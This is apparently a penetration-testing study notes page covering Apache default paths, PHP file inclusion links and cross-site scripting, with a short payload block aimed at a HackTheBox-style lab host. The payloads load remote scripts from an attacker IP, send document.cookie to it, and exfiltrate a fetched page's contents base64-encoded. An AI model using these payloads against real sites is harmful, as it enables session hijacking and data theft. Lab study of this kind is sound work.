# Apache & Languages

## Apache

Find out which OS it's running on first from nmap scan

```
Root: /var/www
for multiple vhosts root is /var/www/[site1] and goes on
Vhost config: /etc/apache2/sites-enabled/000-default.conf
.htaccess and .htpasswd are at root of server
```

{% embed url="https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Apachehttpd2.4defaultlayout(apache.orgsourcepackage):" %}

## PHP

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md" %}

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html" %}

If there is an input field where it fetches a file, you can view the source of php file itself or the apache log for LFI2RCE

PHP deserialization

## Java

### XSS

File transfer and reverse shell

```
### local XSS
<img src=x onerror=alert(1) />

### load image
<img src="http://10.10.14.6/image.png" />

### load script
<script src="http://10.10.14.6/script.js"></script>

fetch('http://10.10.14.6/from_script/' + document.cookie);

### load script
<script>
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.6/exfil?body=" + btoa(body));
})
</script>
```

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" %}

{% embed url="https://brandonrussell.io/OSCP-Notes/XXMore.html" %}

### XXE
